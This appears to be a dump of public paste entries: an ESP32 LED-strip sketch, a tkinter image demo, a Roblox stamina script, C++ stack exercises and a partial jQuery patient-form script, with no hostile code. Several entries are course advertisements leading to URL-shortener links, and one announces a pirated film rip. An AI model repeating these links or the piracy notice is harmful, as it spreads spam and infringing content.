    leds4[ random16(NUM_LEDS) ] += CRGB::White;
    leds5[ random16(NUM_LEDS) ] += CRGB::White;
    leds6[ random16(NUM_LEDS) ] += CRGB::White;
    leds7[ random16(NUM_LEDS) ] += CRGB::White;
    leds8[ random16(NUM_LEDS) ] += CRGB::White;
  }
}

void confetti() 
{
  // random colored speckles that blink in and fade smoothly
  fadeToBlackBy( leds1, NUM_LEDS, 10);
  fadeToBlackBy( leds2, NUM_LEDS, 10);
  fadeToBlackBy( leds3, NUM_LEDS, 10);
  fadeToBlackBy( leds4, NUM_LEDS, 10);
  fadeToBlackBy( leds5, NUM_LEDS, 10);
  fadeToBlackBy( leds6, NUM_LEDS, 10);
  fadeToBlackBy( leds7, NUM_LEDS, 10);
  fadeToBlackBy( leds8, NUM_LEDS, 10);
  int pos = random16(NUM_LEDS);
  //int pos2 = random16(NUM_LEDS2); //Added to adjust for leds2 having a different number of LEDs
  leds1[pos] += CHSV( gHue + random8(64), 200, 255);
  leds2[pos] += CHSV( gHue + random8(64), 200, 255);
  leds3[pos] += CHSV( gHue + random8(64), 200, 255);
  leds4[pos] += CHSV( gHue + random8(64), 200, 255);
  leds5[pos] += CHSV( gHue + random8(64), 200, 255);
  leds6[pos] += CHSV( gHue + random8(64), 200, 255);
  leds7[pos] += CHSV( gHue + random8(64), 200, 255);
  leds8[pos] += CHSV( gHue + random8(64), 200, 255);
}

void sinelon()
{
  // a colored dot sweeping back and forth, with fading trails
  fadeToBlackBy( leds1, NUM_LEDS, 20);
  //fadeToBlackBy( leds2, NUM_LEDS, 20);
  //fadeToBlackBy( leds2, NUM_LEDS2, 20);
  //fadeToBlackBy( leds3, NUM_LEDS, 20);
  int pos = beatsin16( 13, 0, NUM_LEDS-1 );
  //int pos2 = beatsin16( 13, 0, NUM_LEDS2-1 ); //Added to adjust for leds2 having a different number of LEDs
  leds1[pos] += CHSV( gHue, 255, 192);
  //leds2[pos] += CHSV( gHue, 255, 192);
  //leds2[pos2] += CHSV( gHue, 255, 192);
  //leds3[pos] += CHSV( gHue, 255, 192);
}

void bpm() //Note: BPM uses a for loop where NUM_LEDS is part of the loop iteration.  So I can't adjust for NUM_LEDS2
{
  // colored stripes pulsing at a defined Beats-Per-Minute (BPM)
  uint8_t BeatsPerMinute = 62;
  CRGBPalette16 palette = PartyColors_p;
  uint8_t beat = beatsin8( BeatsPerMinute, 64, 255);
  for( int i = 0; i < NUM_LEDS; i++) { //9948
    leds1[i] = ColorFromPalette(palette, gHue+(i*2), beat-gHue+(i*10));
    //leds2[i] = ColorFromPalette(palette, gHue+(i*2), beat-gHue+(i*10));
    //leds3[i] = ColorFromPalette(palette, gHue+(i*2), beat-gHue+(i*10));
  }
}

void juggle() {
  // eight colored dots, weaving in and out of sync with each other
  fadeToBlackBy( leds1, NUM_LEDS, 20);
  fadeToBlackBy( leds2, NUM_LEDS, 20);
  fadeToBlackBy( leds3, NUM_LEDS, 20);
  fadeToBlackBy( leds4, NUM_LEDS, 20);
  fadeToBlackBy( leds5, NUM_LEDS, 20);
  fadeToBlackBy( leds6, NUM_LEDS, 20);
  fadeToBlackBy( leds7, NUM_LEDS, 20);
  fadeToBlackBy( leds8, NUM_LEDS, 20);
  uint8_t dothue = 0;
  for( int i = 0; i < 8; i++) {
    leds1[beatsin16( i+7, 0, NUM_LEDS-1 )] |= CHSV(dothue, 200, 255);
    leds2[beatsin16( i+7, 0, NUM_LEDS-1 )] |= CHSV(dothue, 200, 255);
    leds3[beatsin16( i+7, 0, NUM_LEDS-1 )] |= CHSV(dothue, 200, 255);
    leds4[beatsin16( i+7, 0, NUM_LEDS-1 )] |= CHSV(dothue, 200, 255);
    leds5[beatsin16( i+7, 0, NUM_LEDS-1 )] |= CHSV(dothue, 200, 255);
    leds6[beatsin16( i+7, 0, NUM_LEDS-1 )] |= CHSV(dothue, 200, 255);
    leds7[beatsin16( i+7, 0, NUM_LEDS-1 )] |= CHSV(dothue, 200, 255);
    leds8[beatsin16( i+7, 0, NUM_LEDS-1 )] |= CHSV(dothue, 200, 255);
    dothue += 32;
  }
}

void allWhite() //Sets LED strip to all white - Added by Jonathan DeWitt on 3/24/2022
{
for( int i = 0; i < NUM_LEDS; i++) { //9948
    leds1[i].r = 255;
    leds1[i].g = 255;
    leds1[i].b = 255;
    leds2[i].r = 255;
    leds2[i].g = 255;
    leds2[i].b = 255;
    leds3[i].r = 255;
    leds3[i].g = 255;
    leds3[i].b = 255;
    leds4[i].r = 255;
    leds4[i].g = 255;
    leds4[i].b = 255;
    leds5[i].r = 255;
    leds5[i].g = 255;
    leds5[i].b = 255;
    leds6[i].r = 255;
    leds6[i].g = 255;
    leds6[i].b = 255;
    leds7[i].r = 255;
    leds7[i].g = 255;
    leds7[i].b = 255;
    leds8[i].r = 255;
    leds8[i].g = 255;
    leds8[i].b = 255;
  }
} //End of allWhite function definition

int readBrightness()
{
  String incomingSigS;
  char c;
  
  //while(c != 'g') //lowercase g in ascii is 103
  for (int j=0; j<4; j++) //string begins with capital G and ends with lowercase g it has up to 3 digits in between
  {
    c=SerialBT.read(); //Reads one character at a time from the serial connection and stores it to the char type variable c
    incomingSigS=String(incomingSigS + c); //Builds a string out of the incoming characters i.e. converts character type to string type
    //Serial.print(incomingSigS);
    //Serial.println("""");
  }
  
  PosGI=incomingSigS.indexOf(""G""); //Obtains the index of the start character for the brightness
  PosgI=incomingSigS.indexOf(""g""); //Obtains the index of the end character for the brightness
  LastDigit=PosgI-1; //Index of the last digit of the brightness is always one less than the end character
  BRIGHTNESStest=incomingSigS.substring(PosGI+1, PosgI).toInt(); //Parses out the Brigthness Value
  return BRIGHTNESStest;
}//End of readBrightness function definition

void allBlue()
{ //Sets all LEDs blue - https://github.com/FastLED/FastLED/wiki/Controlling-leds
  for( int i = 0; i < NUM_LEDS; i++) { //9948
    leds1[i].r = 0;
    leds1[i].g = 0;
    leds1[i].b = 255;
    leds2[i].r = 0;
    leds2[i].g = 0;
    leds2[i].b = 255;
    leds3[i].r = 0;
    leds3[i].g = 0;
    leds3[i].b = 255;
    leds4[i].r = 0;
    leds4[i].g = 0;
    leds4[i].b = 255;
    leds5[i].r = 0;
    leds5[i].g = 0;
    leds5[i].b = 255;
    leds6[i].r = 0;
    leds6[i].g = 0;
    leds6[i].b = 255;
    leds7[i].r = 0;
    leds7[i].g = 0;
    leds7[i].b = 255;
    leds8[i].r = 0;
    leds8[i].g = 0;
    leds8[i].b = 255;
  }
} //End of allBlue function definition

void allChartreuse()
{ //Sets all LEDs Chartreuse - https://github.com/FastLED/FastLED/wiki/Controlling-leds
  for( int i = 0; i < NUM_LEDS; i++) { //9948
    leds1[i].r = 127;
    leds1[i].g = 255;
    leds1[i].b = 0;
//    leds2[i].r = 127;
//    leds2[i].g = 255;
//    leds2[i].b = 0;
//    leds3[i].r = 127;
//    leds3[i].g = 255;
//    leds3[i].b = 0;
  }
} //End of allChartreuse function definition

void allBlank()
{ //Sets all LEDs blank - https://github.com/FastLED/FastLED/wiki/Controlling-leds
  for( int i = 0; i < NUM_LEDS; i++) { //9948
    leds1[i].r = 0;
    leds1[i].g = 0;
    leds1[i].b = 0;
//    leds2[i].r = 0;
//    leds2[i].g = 0;
//    leds2[i].b = 0;
//    leds3[i].r = 0;
//    leds3[i].g = 0;
//    leds3[i].b = 0;
  }
} //End of allBlank function definition

//References
//Reference 1- BluetoothLEDTest.ino Located in D:\Stuff\Projects\ESP32 Control\Bluetooth
//Reference 2- DemoReel100Rev4 Located in D:\Stuff\Projects\Arduino Control\Miscellaneous Projects\Addressable LED Strips\Sketches
//Reference 3- DemoReel100Rev1 Located in D:\Stuff\Projects\ESP32 Control\Miscellaneous Projects\Addressable LED Strips
//Reference 4- https://www.rapidtables.com/web/color/html-color-codes.html This is a great way to find out what mixture of RGB colors to use
//Reference 5- https://www.youtube.com/watch?v=E9EKqMYvLS4 Used for Transmitting Multiple Values to the receiving bluetooth app from ESP32
//Reference 6- https://www.youtube.com/watch?v=JQ3tDhpmSFE&t=363s Same purpose of Reference 6 But Less Useful
//Reference 7- http://ai2.appinventor.mit.edu/reference/blocks/lists.html#additems  Used to understand some MIT App Inventor Blocks

//If you are experiencing flickers of light specifically when running animations like the rainbow function but not with static colors like allBlue, it suggests that the flickering is likely related to the animation updates and timing.
//Animations like rainbow require continuous updates to the LED strip at a faster pace, which can lead to timing conflicts with other parts of your code, including the Bluetooth communication. When animations are updating rapidly, the animation frame rate and the frequency of Bluetooth data processing might not be synchronized, leading to flickering issues.
//To address this, you can try the following approaches:
//1. Optimize Animation Updates: Make sure your animation functions are as efficient as possible. If they include any delay or blocking operations, consider using non-blocking techniques like millis() for timing to prevent delays in the main loop. Ensure that the animation update loop doesn't consume too much processing time, allowing for smoother Bluetooth communication.
//2. Separate Animation Updates: Instead of running the animation update and Bluetooth communication within the same loop, consider using separate loops or timers for each. This can help ensure that the two tasks are executed independently and with the appropriate timing.
//3. Use Timer Interrupts: You can use hardware timers or timer interrupts to schedule animation updates at a fixed interval. This can help maintain a consistent frame rate for animations, reducing the chance of flickering.
//4. Adjust Frame Rate: Reduce the frame rate of the animations to a lower value to reduce the rate of animation updates. This may lessen the load on the system and improve synchronization with Bluetooth communication.
//5. Prioritize Bluetooth Communication: If the animations are causing timing conflicts, consider prioritizing the Bluetooth communication and ensuring that it gets sufficient processing time.
//6. Test with Simplified Code: To isolate the issue, try testing with a simplified version of your code that only includes the critical parts related to the animations and Bluetooth communication. This can help you pinpoint the cause of the flickering.
//Remember that managing timing and animation updates can be tricky, especially when you have multiple tasks running concurrently. Thoroughly testing and fine-tuning your code is essential to achieve the desired behavior."
YnregpeG,# tk_512x512_blur_ctrl.py,here2share,Python,Tuesday 19th of December 2023 04:13:32 PM CDT,"# tk_512x512_blur_ctrl.py

import tkinter as tk
import random
from PIL import Image, ImageTk, ImageFilter

ww = 512
hh = 512

root = tk.Tk()
root.title(""tk_512x512_blur_ctrl"")
root.geometry(""%dx%d+%d+%d"" %(ww, hh, 10, 10))

canvas = tk.Canvas(root, width=ww, height=hh)
canvas.pack()

def generate(event=None):
	for size in layers:
		interpolate(size)
	draw()

iii = []
def interpolate(size):
	img = Image.new(""RGBA"", (size, size))
	pixels = img.load()
	grays = the_grays[:]
	for y in range(size):
		for x in range(size):
			random.shuffle(grays)
			gray = grays.pop()[0]
			pixels[x, y] = (gray, gray, gray, 255)
			iii.append(1)
	img = img.resize((ww, hh))
	layers[size] = img

def contour_image(image):
	gray_image = image.convert(""L"")
	threshold = 160	# Adjust threshold as needed
	mask = gray_image.point(lambda x: 255 if x > 230 else x // 10 * 10)
	dilated_mask = mask.filter(ImageFilter.MaxFilter(9))
	red_image = Image.new('RGB', image.size, color='red')
	result_image = Image.composite(image, red_image, dilated_mask)
	return result_image

def draw(event=None):
	buffer = Image.new(""RGBA"", (ww, hh), (255, 255, 255, 255))
	for size, layer_image in layers.items():
		if size != sizes[0]:
			alpha = float(opacity_slider[size].get()) / 2056.0
		else:
			alpha = 1	 
		buffer = Image.blend(buffer, layer_image, alpha)
	
	contoured_image = contour_image(buffer)
	photo = ImageTk.PhotoImage(contoured_image)
	canvas.create_image(0, 0, anchor=tk.NW, image=photo)
	canvas.image = photo

opacity_label = tk.Toplevel(root)
opacity_title = tk.Label(opacity_label, text=""Press Spacebar To Randomize"")
opacity_title.pack()
opacity_slider = {}
layers = {}

the_grays = [(255, 255, 255, 255) for i in range(700)]
the_grays += [(0, 0, 0, 255) for i in range(700)]

size = 8
sizes = []
sizes += [size]
interpolate(size)
while size + 1 < 32:
	size += 7
	sizes += [size]
	opacity_slider[size] = tk.Scale(opacity_label, from_=600, to=0, orient=tk.VERTICAL, label=size, command=draw)
	opacity_slider[size].pack(side=tk.LEFT, fill='both', expand=True)
	interpolate(size)

print(len(iii))

opacity_slider[sizes[1]].set(600)
opacity_slider[sizes[2]].set(320)

canvas.update()
t = opacity_label.winfo_width()
opacity_label.geometry(""%dx300+%d+%d"" %(t, 50, 50))
for t in (root, opacity_label):
	t.bind(""<space>"", generate)
opacity_label.wm_transient(root)

draw()
root.mainloop()"
ym9VeiJu,Stamina,Xocnx,Lua,Tuesday 19th of December 2023 04:10:56 PM CDT,"-- Varibals --
local Player = game.Players.LocalPlayer
local Character = workspace:WaitForChild(Player.Name)
local Humanoid = Character:WaitForChild('Humanoid')
local camera = game.workspace.CurrentCamera
local UserInputService = game:GetService(""UserInputService"")
local TweenService = game:GetService(""TweenService"")
local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
 
 
-- Animations --
local runningAnimation = Instance.new('Animation')
local jumpingAnimation = Instance.new('Animation')
runningAnimation.AnimationId = 'rbxassetid://15679014038' 
jumpingAnimation.AnimationId = 'rbxassetid://10604042437' 
local playRunning = Humanoid:LoadAnimation(runningAnimation)
local playJumping = Humanoid:LoadAnimation(jumpingAnimation)
 
-- Fov --
local FOV = 70 
local walkingFOV = {FieldOfView = FOV}
local sprintFOV = {FieldOfView = FOV + 20} 
 
-- Settings --
local MaxStamina = 100
local Stamina = 100
local defaultSpeed = 9 
local sprintSpeed = 25 
local keepJumpingAnimation = true
local animations = true
local pressed = false
local SprintKey = Enum.KeyCode.LeftShift 
local JumpKey = Enum.KeyCode.Space
local bar = script.Parent.bar
local HungerValue = Player.HungerVal
 
 
-- Create FOV tweens
local tweenEasingStyle = Enum.EasingStyle.Exponential 
local tweenEasingDirection = Enum.EasingDirection.Out
local tweenTime = 0.7
local Info = TweenInfo.new(tweenTime, tweenEasingStyle, tweenEasingDirection)
local runningT = TweenService:Create(camera, Info, sprintFOV)
local walkingT = TweenService:Create(camera, Info, walkingFOV)
 
 
 
 
 
-- Sprint --
UserInputService.InputBegan:Connect(function(input,gameProcessedEvent)
    if input.KeyCode == SprintKey  and gameProcessedEvent == false then
        pressed = true
        Humanoid.WalkSpeed = sprintSpeed
        while Stamina > 0 and pressed do
            Stamina = Stamina - 1
            
            script.Parent.bar:TweenSize(UDim2.new(Stamina / MaxStamina, 0, 1, 0), ""Out"", ""Linear"", .2, true)
            wait()
            if Stamina <= 0 then
                Humanoid.WalkSpeed = defaultSpeed
                walkingT:Play()
                pressed = false
            end
        end
    end
end)
 
-- Jump --
UserInputService.InputBegan:Connect(function(input,gameProcessedEvent)
    if input.KeyCode == JumpKey  and gameProcessedEvent == false then
        pressed = true
        
        while Stamina > 0 and pressed do
            Humanoid.JumpPower = 50
            Stamina = Stamina - 2
 
            script.Parent.bar:TweenSize(UDim2.new(Stamina / MaxStamina, 0, 1, 0), ""Out"", ""Linear"", .2, true)
            wait()
            if Stamina <= 0 then
                Humanoid.JumpPower = 0
                pressed = false
            end
        end
    end
end)
 
 
 
--Hunger--
UserInputService.InputBegan:Connect(function(input,gameProcessedEvent)
    if input.KeyCode == SprintKey and gameProcessedEvent == false then
        pressed = true
        while pressed do
        HungerValue.Value = HungerValue.Value - 1
        wait(2)
            if HungerValue.Value <= 0 then
                pressed = false
            end
        end
    end
end)
 
 
 
--regen--
UserInputService.InputEnded:Connect(function(input,gameProcessedEvent)
    if input.KeyCode == SprintKey or input.KeyCode == JumpKey and gameProcessedEvent == false then
        pressed = false
        Humanoid.WalkSpeed = defaultSpeed
        while Stamina < 100 and not pressed do
            Stamina = Stamina + 1
            script.Parent.bar:TweenSize(UDim2.new(Stamina / MaxStamina, 0, 1, 0), ""Out"", ""Linear"", .2, true)
            walkingT:Play()
            wait(5)
            if Stamina <= 0 then
                Humanoid.WalkSpeed = defaultSpeed
                walkingT:Play()
                pressed = false
            end
        end
    end
end)
 
--run animation--
Humanoid.Running:Connect(function(Speed)
    if Speed > 21 then
        if not playRunning.IsPlaying and animations == true then
            runningT:Play()
            playRunning:Play()
        end
    else
        playRunning:Stop()
    end
end)
 
 
while HungerValue.Value <= 0 do
    wait()
    Stamina = Stamina - 1
end
 
--Text--
while true do
    wait()
    script.Parent.StaminaStatus.Text = math.floor(Stamina) .. ""/"" ..MaxStamina
end"
YKALdbz6,Untitled,sissou123,C#,Tuesday 19th of December 2023 03:43:47 PM CDT,"Beginning Object-oriented Programming with C#
Learn OOP fundamentals applied to the C# programming language
for more:https://dz-linkk.com/hyGGOy"
P118LEKg,Untitled,sissou123,C#,Tuesday 19th of December 2023 03:40:13 PM CDT,"C# in 6 Hours: From Beginner to Pro!
Master the Fundamentals and Level Up Your C# Programming Skills Quickly and Easily!
for more:https://dz-linkk.com/VdYZT5"
GbRSYWEn,Untitled,sissou123,C#,Tuesday 19th of December 2023 03:37:35 PM CDT,"C# Advanced Concepts
Learn the Fundamentals of C# Programming, Become a C# Developer from Scratch, Complete Guide to C# Programming
for more:https://cuty.io/g3q7ND"
ahry4aFS,Untitled,sissou123,C#,Tuesday 19th of December 2023 03:34:12 PM CDT,"Ultimate C# Masterclass for 2024
In-depth .NET programming course from basics to advanced. Focus on clean code, performance and practice.
for more:https://cuty.io/Rnpg0U4eax"
drK2P3VF,Western.2017.Deu.DVDRip.h264.aac.Spa.HardSubs-bp,bpmircea,BrainFuck,Tuesday 19th of December 2023 03:00:56 PM CDT,"Western (Western) (Valeska Grisebach, 2017)
aka
Western.2017.Deu.DVDRip.h264.aac.Spa.HardSubs-bp
https://www.imdb.com/title/tt5157326/

Uploading..."
uDNC5bCC,Untitled,Alice_Schweppes,C++,Tuesday 19th of December 2023 02:56:18 PM CDT,"char* ReadString() {
  size_t str_size = 0;
  size_t str_cap = 1;
  auto str = new char[1];
  char symbol;
  while (true) {
    symbol = getchar();
    if (symbol == '\n') {
      break;
    }
    if (str_size + 1 < str_cap) {
      str[str_size] = symbol;
      ++str_size;
    } else {
      auto str_extend = new char[2 * str_cap];
      for (size_t i = 0; i < str_size; ++i) {
        str_extend[i] = str[i];
      }
      str_extend[str_size] = symbol;
      ++str_size;
      str_cap *= 2;
      delete[] str;
      str = str_extend;
    }
  }
  str[str_size] = '\0';
  return str;
}

void Push(char**& stack, char* str, size_t& stack_size, size_t& stack_cap) {
  if (stack_size < stack_cap) {
    stack[stack_size] = str;
  } else {
    auto stack_extend = new char*[2 * stack_cap];
    for (size_t i = 0; i < stack_size; ++i) {
      stack_extend[i] = stack[i];
      stack[i] = nullptr;
    }
    stack_extend[stack_size] = str;
    delete[] stack;
    stack = stack_extend;
    stack_extend = nullptr;
    delete[] stack_extend;
    stack_cap *= 2;
  }
  str = nullptr;
  delete str;
  ++stack_size;
}

void Pop(char** stack, size_t& stack_size) {
  if (stack_size != 0) {
    for (size_t i = 0; i < strlen(stack[stack_size - 1]); ++i) {
      cout << stack[stack_size - 1][i];
    }
    cout << '\n';
    delete[] stack[stack_size - 1];
    --stack_size;
    return;
  }
  cout << ""error\n"";
}

void Back(char** stack, size_t& stack_size) {
  if (stack_size != 0) {
    for (size_t i = 0; i < strlen(stack[stack_size - 1]); ++i) {
      cout << stack[stack_size - 1][i];
    }
    cout << '\n';
    return;
  }
  cout << ""error\n"";
}

void Clear(char** stack, size_t& stack_size) {
  for (size_t i = 0; i < stack_size; ++i) {
    delete[] stack[i];
  }
  stack_size = 0;
}

void ReadCommand(char* action) {
  int index = 0;
  char character = '\0';
  while (true) {
    character = getchar();
    if (character == ' ' or character == '\n') {
      break;
    }
    action[index] = character;
    ++index;
  }
  if (index <= 5) {
    while (index != 6) {
      action[index] = '\0';
      ++index;
    }
  }
}

int main() {
  auto stack = new char*[1];
  auto action = new char[6];
  size_t size = 0;
  size_t capacity = 1;
  while (true) {
    ReadCommand(action);
    if (strcmp(action, ""push"") == 0) {
      char* str = ReadString();
      Push(stack, str, size, capacity);
      cout << ""ok\n"";
    } else if (strcmp(action, ""pop"") == 0) {
      Pop(stack, size);
    } else if (strcmp(action, ""back"") == 0) {
      Back(stack, size);
    } else if (strcmp(action, ""size"") == 0) {
      cout << size << '\n';
    } else if (strcmp(action, ""clear"") == 0) {
      Clear(stack, size);
      cout << ""ok\n"";
    } else {
      cout << ""bye\n"";
      break;
    }
  }
  delete[] action;
  for (size_t i = 0; i < size; ++i) {
    delete[] stack[i];
  }
  delete[] stack;
}
"
ddLwYzcH,Untitled,Alice_Schweppes,C++,Tuesday 19th of December 2023 02:52:52 PM CDT,"// 4) нужна структура Node, памяти нужно хранить ровно столько, сколько нужно, а
// не в 2 раза больше, нужно переписать
// https://neerc.ifmo.ru/wiki/index.php?title=Стек - ""...не нужно ли расширить
// массив вдвое...""

#include <cstdio>
#include <cstring>
#include <iostream>

char* ReadString() {
  size_t str_size = 0;
  size_t str_cap = 1;
  char* str = new char[1];
  char symbol;
  while (true) {
    symbol = getchar();
    if (symbol == '\n') {
      break;
    }
    if (str_size + 1 < str_cap) {
      str[str_size] = symbol;
      ++str_size;
    } else {
      char* str_extend = new char[2 * str_cap];
      for (size_t i = 0; i < str_size; ++i) {
        str_extend[i] = str[i];
      }
      str_extend[str_size] = symbol;
      ++str_size;
      str_cap *= 2;
      delete[] str;
      str = str_extend;
    }
  }
  str[str_size] = '\0';
  return str;
}

void Push(char**& stack, char* str, size_t& stack_size, size_t& stack_cap) {
  if (stack_size < stack_cap) {
    stack[stack_size] = str;
  } else {
    char** stack_extend = new char*[2 * stack_cap];
    for (size_t i = 0; i < stack_size; ++i) {
      stack_extend[i] = stack[i];
      stack[i] = nullptr;
    }
    stack_extend[stack_size] = str;
    delete[] stack;
    stack = stack_extend;
    stack_extend = nullptr;
    delete[] stack_extend;
    stack_cap *= 2;
  }
  str = nullptr;
  delete str;
  ++stack_size;
}

void Pop(char** stack, size_t& stack_size) {
  if (stack_size != 0) {
    for (size_t i = 0; i < strlen(stack[stack_size - 1]); ++i) {
      std::cout << stack[stack_size - 1][i];
    }
    std::cout << '\n';
    delete[] stack[stack_size - 1];
    --stack_size;
    return;
  }
}

void Back(char** stack, size_t& stack_size) {
  if (stack_size != 0) {
    for (size_t i = 0; i < strlen(stack[stack_size - 1]); ++i) {
      std::cout << stack[stack_size - 1][i];
    }
    std::cout << '\n';
    return;
  }
}

void Clear(char** stack, size_t& stack_size) {
  for (size_t i = 0; i < stack_size; ++i) {
    delete[] stack[i];
  }
  stack_size = 0;
}

void ReadCommand(char* action) {
  int index = 0;
  char character = '\0';
  while (true) {
    character = getchar();
    if (character == ' ' or character == '\n') {
      break;
    }
    action[index] = character;
    ++index;
  }
  if (index <= 5) {
    while (index != 6) {
      action[index] = '\0';
      ++index;
    }
  }
}

int main() {
  char** stack = new char*[1];
  char* action = new char[6];
  size_t size = 0;
  size_t capacity = 1;
  while (true) {
    ReadCommand(action);
    if (strcmp(action, ""push"") == 0) {
      char* str = ReadString();
      Push(stack, str, size, capacity);
      std::cout << ""ok\n"";
    } else if (strcmp(action, ""pop"") == 0) {
      Pop(stack, size);
    } else if (strcmp(action, ""back"") == 0) {
      Back(stack, size);
    } else if (strcmp(action, ""size"") == 0) {
      std::cout << size << '\n';
    } else if (strcmp(action, ""clear"") == 0) {
      Clear(stack, size);
      std::cout << ""ok\n"";
    } else {
      std::cout << ""bye\n"";
      break;
    }
  }
  delete[] action;
  for (size_t i = 0; i < size; ++i) {
    delete[] stack[i];
  }
  delete[] stack;
}
"
YTE4Njs6,Pasien js,dhiforester,jQuery,Tuesday 19th of December 2023 02:50:51 PM CDT,"//Menampilkan Akses Pertama Kali
$('#MenampilkanTabelPasien').html(""Loading..."");
var ProsesBatas = $('#ProsesBatas').serialize();
$.ajax({
    type 	    : 'POST',
    url 	    : '_Page/Pasien/TabelPasien.php',
    data 	    :  ProsesBatas,
    success     : function(data){
        $('#MenampilkanTabelPasien').html(data);
    }
});
//Ketika Batas Data Diubah
$('#batas').change(function(){
    var ProsesBatas = $('#ProsesBatas').serialize();
    $('#MenampilkanTabelPasien').html('Loading...');
    $.ajax({
        type 	    : 'POST',
        url 	    : '_Page/Pasien/TabelPasien.php',
        data 	    :  ProsesBatas,
        success     : function(data){
            $('#MenampilkanTabelPasien').html(data);
        }
    });
});
//Ketika keyword_by
$('#keyword_by').change(function(){
    var keyword_by = $('#keyword_by').val();
    $('#FormKeyword').html('Loading...');
    $.ajax({
        type 	    : 'POST',
        url 	    : '_Page/Pasien/FormKeyword.php',
        data 	    :  {keyword_by: keyword_by},
        success     : function(data){
            $('#FormKeyword').html(data);
        }
    });
});
//Ketika Submit Proses Filter Dan Pencarian
$('#ProsesBatas').submit(function(){
    var ProsesBatas = $('#ProsesBatas').serialize();
    $('#MenampilkanTabelPasien').html('Loading...');
    $.ajax({
        type 	    : 'POST',
        url 	    : '_Page/Pasien/TabelPasien.php',
        data 	    :  ProsesBatas,
        success     : function(data){
            $('#MenampilkanTabelPasien').html(data);
        }
    });
});
//Ketika Modal Tambah Pasien Muncul
$('#ModalTambahPasien').on('show.bs.modal', function (e) {
    $('#NotifikasiTambahPasien').html('<small><code class=""text-primary"">Pastkan data pasien yang anda input sudah benar</code></small>');
});
//Ketika Mengetik nama
$('#nama').keyup(function(){
    var textValue = $('#nama').val();
    //Hitung Jumlah Karakter
    var lengthValue=textValue.length;
    //menampilkan Pada label
    $('#panjang_nama').html(lengthValue);
    //Batas Krakter Yang diketik
    var maxLength=50;
    if (lengthValue > maxLength) {
        // Potong teks menjadi maxLength karakter
        var truncatedText = textValue.substring(0, maxLength);
        // Atur nilai input menjadi teks yang dipotong
        $(this).val(truncatedText);
    }
});
//Ketika Mengetik tempat_lahir
$('#tempat_lahir').keyup(function(){
    var textValue = $('#tempat_lahir').val();
    //Hitung Jumlah Karakter
    var lengthValue=textValue.length;
    //menampilkan Pada label
    $('#panjang_tempat_lahir').html(lengthValue);
    //Batas Krakter Yang diketik
    var maxLength=20;
    if (lengthValue > maxLength) {
        // Potong teks menjadi maxLength karakter
        var truncatedText = textValue.substring(0, maxLength);
        // Atur nilai input menjadi teks yang dipotong
        $(this).val(truncatedText);
    }
});
//Ketika Mengetik alamat
$('#alamat').keyup(function(){
    var textValue = $('#alamat').val();
    //Hitung Jumlah Karakter
    var lengthValue=textValue.length;
    //menampilkan Pada label
    $('#panjang_alamat').html(lengthValue);
    //Batas Krakter Yang diketik
    var maxLength=50;
    if (lengthValue > maxLength) {
        // Potong teks menjadi maxLength karakter
        var truncatedText = textValue.substring(0, maxLength);
        // Atur nilai input menjadi teks yang dipotong
        $(this).val(truncatedText);
    }
});
//propinsi
$('#propinsi').change(function(){
    $('#desa').html(""<option>Pilih</option>"");
    $('#kecamatan').html(""<option>Pilih</option>"");
    $('#kabupaten').html(""<option>Loading..</option>"");
    var kategori = ""Kota Kabupaten"";
    var KodeWilayah = $('#propinsi').val();
    $.ajax({
        type 	: 'POST',
        url 	: '_Page/Pasien/PilihWilayah.php',
        data 	:  {kategori: kategori, KodeWilayah: KodeWilayah},
        success : function(data){
            $('#kabupaten').html(data);
        }
    });
});
//Kabupaten
$('#kabupaten').change(function(){
    $('#desa').html(""<option>Pilih</option>"");
    $('#kecamatan').html(""<option>Loading..</option>"");
    var kategori = ""Kecamatan"";
    var KodeWilayah = $('#kabupaten').val();
    $.ajax({
        type 	: 'POST',
        url 	: '_Page/Pasien/PilihWilayah.php',
        data 	:  {kategori: kategori, KodeWilayah: KodeWilayah},
        success : function(data){
            $('#kecamatan').html(data);
        }
    });
});
//Kecamatan
$('#kecamatan').change(function(){
    $('#desa').html(""<option>Loading..</option>"");
    var kategori = ""Kelurahan"";
    var KodeWilayah = $('#kecamatan').val();
    $.ajax({
        type 	: 'POST',
        url 	: '_Page/Pasien/PilihWilayah.php',
        data 	:  {kategori: kategori, KodeWilayah: KodeWilayah},
        success : function(data){
            $('#desa').html(data);
        }
    });
});
//Ketika Proses Submit Tambah Pasien
$('#ProsesTambahPasien').submit(function(){
    $('#NotifikasiTambahPasien').html('<div class=""spinner-border text-secondary"" role=""status""><span class=""sr-only""></span></div>');
    var form = $('#ProsesTambahPasien')[0];
    var data = new FormData(form);
    $.ajax({
        type 	    : 'POST',
        url 	    : '_Page/Pasien/ProsesTambahPasien.php',
        data 	    :  data,
        cache       : false,
        processData : false,
        contentType : false,
        enctype     : 'multipart/form-data',
        success     : function(data){
            $('#NotifikasiTambahPasien').html(data);
            var NotifikasiTambahPasienBerhasil=$('#NotifikasiTambahPasienBerhasil').html();
            if(NotifikasiTambahPasienBerhasil==""Success""){
                //Menutup Modal
                $('#ModalTambahPasien').modal('hide');
                //Reset Form Tambah
                $('#ProsesTambahPasien')[0].reset();
                //Reset Form Filter Data
                $('#ProsesBatas')[0].reset();
                //Menampilkan Data
                var ProsesBatas = $('#ProsesBatas').serialize();
                $.ajax({
                    type 	    : 'POST',
                    url 	    : '_Page/Pasien/TabelPasien.php',
                    data 	    :  ProsesBatas,
                    success     : function(data){
                        $('#MenampilkanTabelPasien').html(data);
                    }
                });
                //Menampilkan Swal
                swal(""Berhasil!"", ""Tambah Pasien Berhasil"", ""success"");
            }
        }
    });
});
//Modal Detail Pasien
$('#ModalDetailPasien').on('show.bs.modal', function (e) {
    var id_pasien = $(e.relatedTarget).data('id');
    $('#FormDetailPasien').html(""Loading..."");
    $.ajax({
        type 	    : 'POST',
        url 	    : '_Page/Pasien/FormDetailPasien.php',
        data        : {id_pasien: id_pasien},
        success     : function(data){
            $('#FormDetailPasien').html(data);
        }
    });
});
//Modal Edit Pasien
$('#ModalEditPasien').on('show.bs.modal', function (e) {
    var id_pasien = $(e.relatedTarget).data('id');
    $('#FormEditPasien').html(""Loading..."");
    $('#NotifikasiEditPasien').html('<small><code class=""text-primary"">Pastkan data pasien yang anda input sudah benar</code></small>');
    $.ajax({
        type 	    : 'POST',
        url 	    : '_Page/Pasien/FormEditPasien.php',
        data        : {id_pasien: id_pasien},
        success     : function(data){
            $('#FormEditPasien').html(data);
        }
    });
});
//Ketika Proses Submit Edit Pasien
$('#ProsesEditPasien').submit(function(){
